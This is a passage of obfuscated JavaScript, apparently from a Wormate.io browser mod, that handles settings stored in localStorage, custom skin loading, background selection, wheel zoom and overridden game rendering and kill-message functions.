          window.location.reload();
        };
      }
    }
    function _0x2c05b4(_0xe41069) {
      var _0x102d9e = document.getElementById("div_save");
      var _0x3bd451 = document.getElementById("div_sound");
      var _0x171e41 = document.getElementById("div_speed");
      var _0x2c3436 = document.getElementById("div_zigzag");
      var _0x5b1bca = document.getElementById("div_w1");
      var _0x9fa570 = document.getElementById("div_sm");
      var _0x5e39e8 = document.getElementById("sel_sc");
      var _0x29b4f3 = document.getElementById("div_top");
      var _0x513095 = document.getElementById("sel_top");
      if (_0xe41069.e === "not_empty" || window.texture6) {
        if (_0x102d9e) {
          _0x102d9e.style.display = "block";
        }
        if (_0x3bd451) {
          _0x3bd451.style.display = "inline-block";
        }
        if (_0x171e41) {
          _0x171e41.style.display = "inline-block";
        }
        if (_0x2c3436) {
          _0x2c3436.style.display = "inline-block";
        }
        const _0xcccc8 = document.getElementById("zigzag_mode");
        if (_0xcccc8) {
          if (_0x207b06.flx === 0) {
            _0xcccc8.value = "off";
          } else if (_0x207b06.flx === 1) {
            _0xcccc8.value = "type1";
          } else if (_0x207b06.flx === 2) {
            _0xcccc8.value = "type2";
          } else if (_0x207b06.flx === 3) {
            _0xcccc8.value = "type3";
          }
          _0xcccc8.onchange = function () {
            const _0x4ce23a = this.value;
            switch (_0x4ce23a) {
              case "off":
                _0x207b06.flx = 0;
                break;
              case "type1":
                _0x207b06.flx = 1;
                break;
              case "type2":
                _0x207b06.flx = 2;
                break;
              case "type3":
                _0x207b06.flx = 3;
                break;
              default:
                _0x207b06.flx = 0;
            }
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          };
        }
        $("#wupspeed").prop("checked", _0x207b06.vp);
        $("#wupspeed").change(function () {
          _0x207b06.vp = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#saveGame").prop("checked", _0x207b06.cs);
        $("#saveGame").change(function () {
          _0x207b06.cs = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        if (_0x207b06.mobile) {
          if (_0x5b1bca) {
            _0x5b1bca.style.display = "none";
          }
          _0x207b06.sc = 0;
          _0x207b06.wi = 0;
        } else {
          if (_0x5b1bca) {
            _0x5b1bca.style.display = "inline-block";
          }
          if (_0x5e39e8) {
            _0x5e39e8.value = _0x207b06.sc;
            _0x5e39e8.onchange = function () {
              _0x207b06.sc = parseInt(_0x5e39e8.value);
              if (_0x207b06.sc == 1) {
                _0x207b06.wi = screen.height / (screen.width * 2);
              }
              if (_0x207b06.sc == 2) {
                _0x207b06.wi = 0;
              }
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
            };
          }
        }
        if (_0x9fa570) {
          _0x9fa570.style.display = "inline-block";
        }
        var _0x44cdd1 = document.getElementById("sel_sm");
        if (_0x44cdd1) {
          _0x44cdd1.value = _0x207b06.sm;
          _0x44cdd1.onchange = function () {
            _0x207b06.sm = parseInt(_0x44cdd1.value);
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          };
        }
        if (_0x29b4f3) {
          _0x29b4f3.style.display = "inline-block";
        }
        if (_0x513095) {
          _0x513095.value = _0x207b06.to;
          _0x513095.onchange = function () {
            _0x207b06.to = parseInt(_0x513095.value);
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          };
        }
        $("#wupsound").prop("checked", _0x207b06.vh);
        $("#wupsound").change(function () {
          _0x207b06.vh = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#Laserup").prop("checked", _0x207b06.ls);
        $("#Laserup").change(function () {
          _0x207b06.ls = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#kill_show_name").prop("checked", _0x207b06.showKillName !== false);
        $("#headshot_show_name").prop("checked", _0x207b06.showHeadshotName !== false);
        $("#kill_name_position").val(_0x207b06.killNamePos || "after");
        $("#headshot_name_position").val(_0x207b06.headshotNamePos || "after");
        $("#kill_show_name").change(function () {
          _0x207b06.showKillName = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_show_name").change(function () {
          _0x207b06.showHeadshotName = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#kill_name_position").change(function () {
          _0x207b06.killNamePos = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        $("#headshot_name_position").change(function () {
          _0x207b06.headshotNamePos = $(this).val();
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        });
        window.wormupMessages = {
          toggleDefaultMessages: function () {
            if (_0x207b06.iq) {
              $("#custom-messages-container").addClass("messages-disabled");
            } else {
              $("#custom-messages-container").removeClass("messages-disabled");
            }
          },
          updateMessageSettings: function () {
            $("#wupiq").prop("checked", _0x207b06.iq);
            $("#kill_msg").val(_0x207b06.killMsg || "KILLED");
            $("#headshot_msg").val(_0x207b06.headshotMsg || "HEADSHOT");
            $("#kill_show_name").prop("checked", _0x207b06.showKillName !== false);
            $("#headshot_show_name").prop("checked", _0x207b06.showHeadshotName !== false);
            $("#kill_name_position").val(_0x207b06.killNamePos || "after");
            $("#headshot_name_position").val(_0x207b06.headshotNamePos || "after");
            $("#kill_custom_text").val(_0x207b06.killCustomText || "");
            $("#headshot_custom_text").val(_0x207b06.headshotCustomText || "");
            this.toggleDefaultMessages();
          }
        };
        $("#wupiq").off("change.messages").on("change.messages", function () {
          _0x207b06.iq = $(this).prop("checked");
          localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
          if (window.wormupMessages) {
            window.wormupMessages.toggleDefaultMessages();
          }
        });
        const _0x4719ff = localStorage.getItem("showFpsCpu") === "true";
        $("#performance-monitor-toggle").prop("checked", _0x4719ff);
        $("#performance-monitor-toggle").change(function () {
          const _0x918166 = $(this).prop("checked");
          localStorage.setItem("showFpsCpu", _0x918166);
          if (window.PerformanceMonitor) {
            window.PerformanceMonitor.toggle(_0x918166);
          }
        });
        const _0x35f1ed = localStorage.getItem("wupPulseEnabled") === "true" || localStorage.getItem("wupPulseEnabled") === null;
        $("#pulse_effects_enabled").prop("checked", _0x35f1ed);
        window.pulseEnabled = _0x35f1ed;
        $("#pulse_effects_enabled").change(function () {
          window.pulseEnabled = $(this).prop("checked");
          localStorage.setItem("wupPulseEnabled", window.pulseEnabled.toString());
        });
        _0x207b06.c_1 = _0xe41069.streamer;
        if (_0x207b06.hz && typeof _0x7a9760 !== "undefined") {
          if (_0x7a9760.wheelHandler) {
            _0x7a9760.removeEventListener("wheel", _0x7a9760.wheelHandler);
          }
          _0x7a9760.wheelHandler = function (_0xa3ad06) {
            if (!_0x207b06.ctrl && (_0x207b06.z >= 0.2 && _0x207b06.z <= 25 || _0x207b06.z < 0.2 && _0xa3ad06.deltaY < 0 || _0x207b06.z > 25 && _0xa3ad06.deltaY > 0)) {
              _0x207b06.z = _0x207b06.z + _0xa3ad06.deltaY * -_0x207b06.zoomSpeed;
              if (_0x207b06.z < 0.5) {
                _0x207b06.z = 0.5;
              }
            }
          };
          _0x7a9760.addEventListener("wheel", _0x7a9760.wheelHandler, {
            passive: true
          });
        }
        if (typeof _0x20dc71 === "function") {
          _0x20dc71(_0x207b06, window.oeo);
        }
        if (typeof _0x5c2dcc !== "undefined") {
          _0x5c2dcc.on = true;
        }
        if (typeof _0x2964bf === "function" && _0x2964bf()) {
          _0x207b06.tt = _0xe41069.tt == 1;
          if (typeof ooo !== "undefined" && ooo.Xg && ooo.Xg.Kf && ooo.Xg.Kf.Wg && ooo.Xg.Kf.Wg.Ah) {
            var _0x56a0f0 = ooo.Xg.Kf.Wg.Ah;
            _0x56a0f0.img_1.visible = _0x5c2dcc.on && _0x207b06.mo == 1;
            _0x56a0f0.img_2.visible = _0x5c2dcc.on && _0x207b06.mo == 2;
            _0x56a0f0.img_3.visible = _0x5c2dcc.on && _0x207b06.mo == 3;
            _0x56a0f0.img_4.visible = _0x5c2dcc.on && (_0x207b06.mo == 4 || _0x207b06.mo == 5 || _0x207b06.mo == 6);
          }
        } else {
          _0x207b06.tt = false;
        }
      }
    }
    function _0x5ccd40(_0x5efb60) {
      var _0x3526f5 = [{
        nome: "Default",
        uri: atob(_0x56e2a2[24])
      }, {
        nome: "Stardust",
        uri: atob(_0x56e2a2[28])
      }, {
        nome: "Nightdots",
        uri: atob(_0x56e2a2[29])
      }, {
        nome: "Galaxy Star",
        uri: atob(_0x56e2a2[37])
      }, {
        nome: "Hexvoid",
        uri: atob(_0x56e2a2[32])
      }, {
        nome: "Crystalblue",
        uri: atob(_0x56e2a2[31])
      }, {
        nome: "Nebula",
        uri: atob(_0x56e2a2[26])
      }, {
        nome: "Bluemist",
        uri: atob(_0x56e2a2[25])
      }, {
        nome: "Prism",
        uri: atob(_0x56e2a2[30])
      }, {
        nome: "Cloudscape",
        uri: atob(_0x56e2a2[27])
      }, {
        nome: "Desert",
        uri: atob(_0x56e2a2[38])
      }, {
        nome: "Crystalblue 2",
        uri: atob(_0x56e2a2[39])
      }];
      _0x207b06.c_2 = _0x5efb60.programmer;
      let _0x489ec5 = $(".background-grid");
      if (_0x489ec5.length > 0) {
        _0x489ec5.empty();
        _0x3526f5.forEach(function (_0x1e3597) {
          const _0x4cd24d = _0x207b06.background === _0x1e3597.uri;
          const _0x3181bd = $("\n              <div class=\"background-item " + (_0x4cd24d ? "active" : "") + "\" data-bg=\"" + _0x1e3597.uri + "\" data-bg-name=\"" + _0x1e3597.nome + "\" style=\"cursor: pointer; border: 2px solid " + (_0x4cd24d ? "#ffcc00" : "#333333") + "; border-radius: 8px; overflow: hidden; margin: 5px; background-color: #232339;\">\n                <img src=\"" + _0x1e3597.uri + "\" alt=\"" + _0x1e3597.nome + "\" style=\"width: 100%; height: 65px; object-fit: cover;\">\n                <div style=\"text-align: center; padding: 5px; font-size: 10px; color: #ffffff;\">" + _0x1e3597.nome + "</div>\n              </div>\n            ");
          _0x3181bd.click(function () {
            $(".background-item").removeClass("active").css("border-color", "#333333");
            $(this).addClass("active").css("border-color", "#ffcc00");
            const _0x3dd61e = $(this).data("bg");
            const _0x25e9ce = $(this).data("bg-name");
            _0x207b06.background = _0x3dd61e;
            localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
            if (ooo && ooo.ef && ooo.ef.F_bg && ooo.ef.fn_o) {
              ooo.ef.F_bg = new PIXI.Texture(ooo.ef.fn_o(_0x3dd61e));
            }
            $("#backgroundArena").val(_0x3dd61e);
          });
          _0x489ec5.append(_0x3181bd);
        });
      }
      let _0x46de59 = document.getElementById("backgroundArena");
      if (_0x46de59) {
        _0x46de59.innerHTML = "";
        for (var _0x4ec3ce = 0; _0x4ec3ce < _0x3526f5.length; _0x4ec3ce++) {
          let _0xa5da65 = document.createElement("option");
          _0xa5da65.value = _0x3526f5[_0x4ec3ce].uri;
          _0xa5da65.setAttribute("data-imageSrc", _0x3526f5[_0x4ec3ce].uri);
          _0xa5da65.setAttribute("data-descriptione", _0x3526f5[_0x4ec3ce].nome);
          _0xa5da65.innerHTML = _0x3526f5[_0x4ec3ce].nome;
          _0x46de59.appendChild(_0xa5da65);
        }
        _0x207b06.c_3 = _0x5efb60.extension;
        _0x46de59.value = _0x207b06.background || _0x3526f5[0].uri;
        if (typeof $ !== "undefined" && $.fn.wupsle) {
          $("#backgroundArena").wupsle({
            onSelected: function () {
              _0x207b06.background = $("#backgroundArena-value").val();
              localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
              if (typeof ooo !== "undefined" && ooo.ef) {
                ooo.ef.F_bg = new PIXI.Texture(ooo.ef.fn_o(_0x207b06.background));
              }
              const _0xdc3aea = _0x207b06.background;
              $(".background-item").removeClass("active").css("border-color", "#333333");
              $(".background-item[data-bg=\"" + _0xdc3aea + "\"]").addClass("active").css("border-color", "#ffcc00");
            }
          });
        }
      }
    }
    function _0x46f479() {
      $("#btn_clear_file").click(function () {
        localStorage.removeItem("custom_wear");
        localStorage.removeItem("custom_skin");
        window.location.reload();
      });
      var _0x3716df = document.getElementById("btn_crsw");
      var _0x5b82ac = document.getElementById("div_crsw");
      function _0x59221c(_0x4ac2dd) {
        if (_0x4ac2dd.target.result.indexOf("\"wear\":") !== -1) {
          localStorage.setItem("custom_wear", _0x4ac2dd.target.result);
        } else {
          localStorage.setItem("custom_skin", _0x4ac2dd.target.result);
        }
        window.location.href = "https://wormate.io/";
      }
      if (_0x3716df) {
        _0x3716df.style.display = "inline-block";
      }
      if (_0x5b82ac) {
        _0x5b82ac.style.display = "block";
      }
      var _0x615ac2 = document.getElementById("fileSkin");
      if (_0x615ac2) {
        _0x615ac2.addEventListener("change", function (_0x47d059) {
          var _0x2ec529 = new FileReader();
          _0x2ec529.onload = _0x59221c;
          _0x2ec529.readAsText(_0x47d059.target.files[0]);
        });
      }
    }
    function _0xcf303d(_0x2467af) {
      _0x207b06.c_4 = _0x2467af.game;
      if (_0x207b06.mobile) {
        $("#config_mobile").html(_0x2467af.mb);
        var _0x2e3a17 = document.getElementById("joystick_checked");
        var _0x3384eb = document.getElementById("joystick_color");
        var _0x461391 = document.getElementById("joystick_mode");
        var _0x1a14ae = document.getElementById("joystick_position");
        var _0x1e86a6 = document.getElementById("joystick_size");
        var _0xcaf29c = document.getElementById("joystick_pxy");
        function _0x548550() {
          if (typeof _0x153895 === "function") {
            _0x153895(_0x2e3a17);
          }
          if (typeof _0x31aafd === "function") {
            _0x31aafd(_0x3384eb);
          }
          if (typeof _0x1aaa19 === "function") {
            _0x1aaa19(_0x461391);
          }
          if (typeof _0x15cb63 === "function") {
            _0x15cb63(_0x1a14ae);
          }
          if (typeof _0x3dfdfb === "function") {
            _0x3dfdfb(_0xcaf29c);
          }
          if (typeof _0x2b5b6e === "function") {
            _0x2b5b6e(_0x1e86a6);
          }
        }
        if (_0x2e3a17) {
          _0x2e3a17.onchange = _0x548550;
        }
        if (_0x3384eb) {
          _0x3384eb.onchange = _0x548550;
        }
        if (_0x461391) {
          _0x461391.onchange = _0x548550;
        }
        if (_0x1a14ae) {
          _0x1a14ae.onchange = _0x548550;
        }
        if (_0x1e86a6) {
          _0x1e86a6.onchange = _0x548550;
        }
        if (_0xcaf29c) {
          _0xcaf29c.onchange = _0x548550;
        }
        if (_0x207b06.joystick) {
          $("#joystick_checked").val(_0x207b06.joystick.checked);
          $("#joystick_color").val(_0x207b06.joystick.color);
          $("#joystick_mode").val(_0x207b06.joystick.mode);
          $("#joystick_position").val(_0x207b06.joystick.positionMode);
          $("#joystick_size").val(_0x207b06.joystick.size);
          $("#joystick_pxy").val(_0x207b06.joystick.pxy);
        } else {
          $("#joystick_checked").val(true);
          $("#joystick_color").val("red");
          $("#joystick_mode").val("dynamic");
          $("#joystick_position").val("L");
          $("#joystick_size").val(100);
          $("#joystick_pxy").val(100);
        }
        _0x548550();
      }
      if (typeof _0xfa7e1 !== "undefined" && typeof _0x59132f === "function") {
        _0xfa7e1.on("mousedown", _0x59132f);
      }
      if (typeof _0x2e32b4 !== "undefined" && typeof _0x430cb9 === "function") {
        _0x2e32b4.on("mousedown", _0x430cb9);
      }
      if (typeof _0x314f33 !== "undefined" && typeof _0x1eba92 === "function") {
        _0x314f33.on("mousedown", _0x1eba92);
      }
      _0x207b06.c_5 = _0x2467af.note;
    }
    function _0x262451() {
      const _0xda85e1 = setInterval(() => {
        if (window.utils && window.utils.prototype && window.config && window.config.prototype && window.savedGame && window.savedGame.prototype) {
          clearInterval(_0xda85e1);
          const _0x3b8d42 = window.utils.prototype.Qj;
          window.utils.prototype.Qj = function (_0x2708e2, _0x28a2bc, _0x427a29) {
            this.Hj = window.decoder.ga(this.Hj, this.Fj, _0x28a2bc, window.gameSettings.eat_animation);
            this.Ij = window.decoder.ga(this.Ij, this.Gj, _0x28a2bc, 0.0025);
            this.Nj.Bg(this, _0x2708e2, _0x28a2bc, _0x427a29);
          };
          const _0x12851d = window.config.prototype.Bg;
          window.config.prototype.Bg = function (_0x3f06ac, _0x50f4c7, _0x21b096, _0x3aea5c) {
            if (!_0x3aea5c(_0x3f06ac.Hj, _0x3f06ac.Ij)) {
              this.Wh.Cd();
              return;
            }
            var _0x36bc07 = _0x3f06ac.Kj * (1 + window.decoder.pa(_0x3f06ac.Mj + _0x50f4c7 / 200) * 0.3);
            if (_0x3f06ac.Ej) {
              this.Wh.Ad(_0x3f06ac.Hj, _0x3f06ac.Ij, window.gameSettings.PortionSize * _0x3f06ac.Jj, _0x3f06ac.Lj * 1, window.gameSettings.PortionAura * _0x36bc07, window.gameSettings.PortionTransparent * _0x3f06ac.Lj);
            } else {
              this.Wh.Ad(_0x3f06ac.Hj, _0x3f06ac.Ij, window.gameSettings.FoodSize * _0x3f06ac.Jj, _0x3f06ac.Lj * 1, window.gameSettings.FoodShadow * _0x36bc07, window.gameSettings.FoodTransparent * _0x3f06ac.Lj);
            }
          };
          const _0x50cb71 = window.savedGame.prototype.ug;
          window.savedGame.prototype.ug = function (_0x22a20f, _0x3a0d6d) {
            const _0xd91052 = _0x50cb71.apply(this, arguments);
            if (this.Fh && typeof this.Fh.x !== "undefined" && window.ooo && window.ooo.Mh) {
              const _0x563c0d = window.ooo.Mh.Oh();
              if (_0x563c0d && typeof _0x563c0d._a !== "undefined") {
                this.Fh.x = window.decoder.ja(this.Fh.x, _0x563c0d._a, _0x3a0d6d, window.gameSettings.smoothCamera, 33.333);
              }
            }
            return _0xd91052;
          };
          window.savedGame.prototype.Vg = function (_0x18e7fb, _0x5287bc) {
            _0x623736(_0x207b06, oeo, "count", _0x18e7fb);
            if (_0x18e7fb && _0x207b06.vh) {
              if (_0x207b06.headshot % 10 !== 0 || !(_0x207b06.headshot > 0)) {
                if (typeof window.playHeadshotSound === "function") {
                  window.playHeadshotSound();
                }
              }
            }
            if (_0x18e7fb) {
              var _0xc31595 = "";
              if (_0x207b06.iq) {
                _0xc31595 = "HeadShot 🚬";
              } else if (_0x207b06.headshotCustomText && _0x207b06.headshotCustomText.trim() !== "") {
                _0xc31595 = _0x207b06.headshotCustomText;
              } else if (_0x207b06.headshotMsg) {
                _0xc31595 = _0x207b06.headshotMsg;
              } else {
                _0xc31595 = "HEADSHOT";
              }
              var _0x48601c = _0xc31595;
              if (!_0x207b06.iq && _0x207b06.showHeadshotName !== false && _0x5287bc) {
                if (_0x207b06.headshotNamePos === "before") {
                  _0x48601c = _0x5287bc + " " + _0xc31595;
                } else {
                  _0x48601c = _0xc31595 + " " + _0x5287bc;
                }
              }
              var _0x527796 = _0x7f096e(_0x48601c, true);
              this.addChild(_0x527796);
              this.Sg.push(_0x527796);
            } else {
              var _0xc31595 = "";
              if (_0x207b06.iq) {
                _0xc31595 = "WellDone !!🔨";
              } else if (_0x207b06.killCustomText && _0x207b06.killCustomText.trim() !== "") {
                _0xc31595 = _0x207b06.killCustomText;
              } else if (_0x207b06.killMsg) {
                _0xc31595 = _0x207b06.killMsg;
              } else {
                _0xc31595 = "KILLED";
              }
              var _0x48601c = _0xc31595;
              if (!_0x207b06.iq && _0x207b06.showKillName !== false && _0x5287bc) {
                if (_0x207b06.killNamePos === "before") {
                  _0x48601c = _0x5287bc + " " + _0xc31595;
                } else {
                  _0x48601c = _0xc31595 + " " + _0x5287bc;
                }
              }
              var _0x28bd52 = _0x7f096e(_0x48601c, false);
              this.addChild(_0x28bd52);
              this.Sg.push(_0x28bd52);
            }
          };
        }
      }, 1000);
    }
    setTimeout(_0x262451, 1000);
    window.playHeadshotSound = function () {
      if (_0x207b06.vh) {
        const _0x5ade13 = document.getElementById("s_h");
        if (_0x5ade13) {
          _0x5ade13.volume = _0x207b06.soundVolume / 100;
          _0x5ade13.currentTime = 0;
          _0x5ade13.play();
        }
      }
    };
    setTimeout(() => {
      if (window.sectorSystem && typeof window.sectorSystem.init === "function") {
        window.sectorSystem.init();
      }
    }, 1000);
    $(".sidebar-item[data-tab='backgrounds']").on("click", function () {
      if (window.sectorSystem && typeof window.sectorSystem.initUserInterface === "function") {
        setTimeout(() => window.sectorSystem.initUserInterface(), 100);
      }
    });
    Ysw = async function (_0x411e5f) {
      var _0x3ccb89 = await _0x411e5f;
      try {
        _0x207b06.gg = [];
        _0x207b06.sg = [];
        var _0x5daa47 = 0;
        if (_0x3ca2a7 && (_0x3ca2a7 = JSON.parse(_0x3ca2a7)).wear) {
          for (var _0x20eeb5 in _0x3ca2a7.wear.textureDict) {
            if (_0x3ca2a7.wear.textureDict[_0x20eeb5].file.search("data:image/png;base64,") == -1) {
              _0x3ca2a7.wear.textureDict[_0x20eeb5].file = "data:image/png;base64," + _0x3ca2a7.wear.textureDict[_0x20eeb5].file.substr(_0x3ca2a7.wear.textureDict[_0x20eeb5].file.length - _0x207b06.c_v, _0x207b06.c_v) + _0x3ca2a7.wear.textureDict[_0x20eeb5].file.substr(0, _0x3ca2a7.wear.textureDict[_0x20eeb5].file.length - _0x207b06.c_v);
            }
            _0x3ccb89.textureDict[_0x20eeb5] = _0x3ca2a7.wear.textureDict[_0x20eeb5];
          }
          for (let _0x572ca8 in _0x3ca2a7.wear.regionDict) {
            _0x3ccb89.regionDict[_0x572ca8] = _0x3ca2a7.wear.regionDict[_0x572ca8];
            _0x3ccb89[(_0x20eeb5 = _0x3ccb89.regionDict[_0x572ca8]).list][_0x20eeb5.id] = _0x20eeb5.obj;
            _0x3ccb89[_0x20eeb5.listVariant].push([_0x20eeb5.id]);
          }
        }
        if (_0x2f2e61) {
          if ((_0x2f2e61 = JSON.parse(_0x2f2e61)).csg) {
            var _0x1a087c = 0;
            var _0x64f06 = false;
            var _0x4cccd2 = 0;
            for (var _0x12ce94 in _0x2f2e61.csg["0"]) {
              for (var _0x28d9d6 = _0x2f2e61.csg["1"][_0x12ce94].split("|"), _0x1a92d7 = 0; _0x1a92d7 < _0x28d9d6.length; _0x1a92d7++) {
                _0x3ccb89.textureDict["t_wup_" + (_0x207b06.g / 9 * 1000 + _0x4cccd2)] = {
                  custom: true,
                  file: "data:image/png;base64," + _0x28d9d6[_0x1a92d7].substr(_0x28d9d6[_0x1a92d7].length - _0x207b06.c_v, _0x207b06.c_v) + _0x28d9d6[_0x1a92d7].substr(0, _0x28d9d6[_0x1a92d7].length - _0x207b06.c_v)
                };
                _0x4cccd2++;
              }
              var _0x421f3d = _0x2f2e61.csg["2"][_0x12ce94];
              var _0x3f1b8b = 0;
              var _0x47174b = atob(_0x56e2a2[36]);
              var _0x11a838 = "GIF SKIN";
              var _0x26113d = 0;
              for (var _0x20eeb5 in _0x421f3d) {
                _0x26113d++;
              }
              for (var _0x20eeb5 in _0x421f3d) {
                if (_0x3f1b8b == 0) {
                  var _0x5986a9 = {
                    id: _0x207b06.g * 100 + _0x1a087c,
                    base: [],
                    guest: true,
                    g: false,
                    price: 0,
                    priceBefore: 0,
                    nonbuyable: true,
                    prime: "c_white",
                    glow: _0x421f3d[_0x20eeb5]
                  };
                  for (var _0x1a92d7 = 0; _0x1a92d7 < _0x421f3d[_0x20eeb5].length; _0x1a92d7++) {
                    _0x5986a9.base.push("s_wup_" + (_0x207b06.g / 9 * 1000 + _0x5daa47) + "_" + (_0x421f3d[_0x20eeb5].length - _0x1a92d7));
                  }
                  _0x3ccb89.skinArrayDict.push(_0x5986a9);
                  var _0x4cb51d = _0x207b06.sg.indexOf(_0x5986a9.id);
                  if (_0x4cb51d == -1) {
                    _0x207b06.sg.push(_0x5986a9.id);
                    _0x207b06.gg.push({
                      s: _0x207b06.g / 9 * 1000 + _0x5daa47,
                      e: _0x207b06.g / 9 * 1000 + _0x5daa47 + _0x26113d - 1,
                      t: parseInt(_0x2f2e61.csg["0"][_0x12ce94].substr(0, 1)) * 100,
                      r: _0x2f2e61.csg["0"][_0x12ce94].substr(1, 1) == "1"
                    });
                  }
                  if (_0x64f06) {
                    for (var _0x4daafd in _0x3ccb89.skinGroupArrayDict) {
                      if (_0x3ccb89.skinGroupArrayDict[_0x4daafd].id == _0x11a838) {
                        _0x3ccb89.skinGroupArrayDict[_0x4daafd].list.push(_0x5986a9.id);
                      }
                    }
                  } else {
                    _0x3ccb89.skinGroupArrayDict.push({
                      isCustom: true,
                      id: _0x11a838,
                      img: _0x47174b,
                      name: {
                        de: _0x11a838,
                        en: _0x11a838,
                        es: _0x11a838,
                        fr: _0x11a838,
                        uk: _0x11a838
                      },
                      list: [_0x5986a9.id]
                    });
                    _0x64f06 = true;
                  }
                  _0x1a087c++;
                }
                var _0x5986a9 = {
                  id: _0x207b06.g / 9 * 1000 + _0x5daa47,
                  base: [],
                  guest: true,
                  g: true,
                  price: 0,
                  priceBefore: 0,
                  nonbuyable: true,
                  prime: "c_white",
                  glow: _0x421f3d[_0x20eeb5]
                };
                for (var _0x1a92d7 = 0; _0x1a92d7 < _0x421f3d[_0x20eeb5].length; _0x1a92d7++) {
                  _0x5986a9.base.push("s_wup_" + _0x5986a9.id + "_" + (_0x421f3d[_0x20eeb5].length - _0x1a92d7));
                  _0x3ccb89.regionDict["s_wup_" + _0x5986a9.id + "_" + (_0x1a92d7 + 1)] = {
                    texture: "t_wup_" + _0x5986a9.id,
                    h: 96,
                    w: 96,
                    x: (_0x1a92d7 || 0) * 99,
                    y: 0
                  };
                }
                _0x3ccb89.skinArrayDict.push(_0x5986a9);
                _0x3f1b8b++;
                _0x5daa47++;
              }
            }
          } else {
            var _0x512af4 = [];
            var _0x47174b = atob(_0x56e2a2[33]);
            for (let _0x309d64 in _0x2f2e61) {
              if (_0x309d64 != "img") {
                if (_0x2f2e61[_0x309d64].textureDict[_0x309d64].file.search("data:image/png;base64,") == -1) {
                  _0x2f2e61[_0x309d64].textureDict[_0x309d64].file = "data:image/png;base64," + _0x2f2e61[_0x309d64].textureDict[_0x309d64].file.substr(_0x2f2e61[_0x309d64].textureDict[_0x309d64].file.length - _0x207b06.c_v, _0x207b06.c_v) + _0x2f2e61[_0x309d64].textureDict[_0x309d64].file.substr(0, _0x2f2e61[_0x309d64].textureDict[_0x309d64].file.length - _0x207b06.c_v);
                }
                _0x3ccb89.textureDict[_0x309d64] = _0x2f2e61[_0x309d64].textureDict[_0x309d64];
                for (let _0x1e3c6e in _0x2f2e61[_0x309d64].regionDict) {
                  _0x3ccb89.regionDict[_0x1e3c6e] = _0x2f2e61[_0x309d64].regionDict[_0x1e3c6e];
                }
                _0x3ccb89.skinArrayDict.push(_0x2f2e61[_0x309d64].skin);
                _0x512af4.push(_0x2f2e61[_0x309d64].skin.id);
              } else if (_0x2f2e61[_0x309d64] != "customer") {
                _0x47174b = _0x2f2e61[_0x309d64];
              }
            }
            _0x3ccb89.skinGroupArrayDict.push({
              isCustom: true,
              id: "customer",
              img: _0x47174b,
              name: {
                de: "Customer",
                en: "Customer",
                es: "Customer",
                fr: "Customer",
                uk: "Customer"
              },
              list: _0x512af4
            });
          }
        }
        if (Array.isArray(_0x207b06.dg) && _0x207b06.dg.length > 0) {
          for (var _0x20eeb5 in _0x207b06.dg) {
            var _0x11ab2b = _0x207b06.dg[_0x20eeb5].split("|");
            var _0x1d1d15 = {
              g: _0x11ab2b["0"]
            };
            await fetch(_0x207b06.s_l + "/store", {
              headers: {
                "Content-Type": "application/json"
              },
              method: "POST",
              body: JSON.stringify(_0x1d1d15)
            }).then(async function (_0x2fa53a) {
              _0x2fa53a = await _0x2fa53a.json();
              _0x3ccb89.textureDict["t_wup_" + _0x11ab2b["0"] + "_skin_g"] = {
                custom: true,
                relativePath: _0x2fa53a.csg["1"]["0"]
              };
              var _0x12ed4f = _0x2fa53a.csg["2"]["0"];
              var _0x563bdb = 0;
              for (var _0x5d5b03 in _0x12ed4f) {
                _0x563bdb++;
              }
              _0x207b06.sg.push(parseInt(_0x11ab2b["1"]));
              _0x207b06.gg.push({
                s: _0x207b06.g / 9 * 1000 + _0x5daa47,
                e: _0x207b06.g / 9 * 1000 + _0x5daa47 + _0x563bdb - 1,
                t: parseInt(_0x2fa53a.csg["0"]["0"].substr(0, 1)) * 100,
                r: _0x2fa53a.csg["0"]["0"].substr(1, 1) == "1"
              });
              var _0x104e20 = 0;
              for (var _0x5d5b03 in _0x12ed4f) {
                var _0x55d020 = {
                  id: _0x207b06.g / 9 * 1000 + _0x5daa47,
                  base: [],
                  guest: true,
                  g: true,
                  price: 0,
                  priceBefore: 0,
                  nonbuyable: true,
                  prime: "c_white",
                  glow: _0x12ed4f[_0x5d5b03]
                };
                for (var _0x33fc38 = 0; _0x33fc38 < _0x12ed4f[_0x5d5b03].length; _0x33fc38++) {
                  _0x55d020.base.push("s_wup_" + _0x55d020.id + "_" + (_0x12ed4f[_0x5d5b03].length - _0x33fc38));
                  _0x3ccb89.regionDict["s_wup_" + _0x55d020.id + "_" + (_0x33fc38 + 1)] = {
                    texture: "t_wup_" + _0x11ab2b["0"] + "_skin_g",
                    h: 96,
                    w: 96,
                    x: (_0x33fc38 || 0) * 99,
                    y: (_0x104e20 || 0) * 99
                  };
                }
                _0x3ccb89.skinArrayDict.push(_0x55d020);
                _0x5daa47++;
                _0x104e20++;
              }
            }).catch(function (_0x576314) {});
          }
        }
      } catch (_0x3a95cc) {
        localStorage.removeItem("custom_wear");
        localStorage.removeItem("custom_skin");
        window.location.reload();
      }
      return _0x3ccb89;
    };
    var _0x201df0 = false;
    if (_0x201df0) {
      _0x201df0 = false;
      s_h.pause();
    }
    (function (_0x47abec) {
      _0x47abec.fn.wupsle = function (_0x36c9a4) {
        if (_0x25e2b6[_0x36c9a4]) {
          return _0x25e2b6[_0x36c9a4].apply(this, Array.prototype.slice.call(arguments, 1));
        } else if (typeof _0x36c9a4 != "object" && _0x36c9a4) {
          _0x47abec.error("Method " + _0x36c9a4 + " does not exists.");
          return;
        } else {
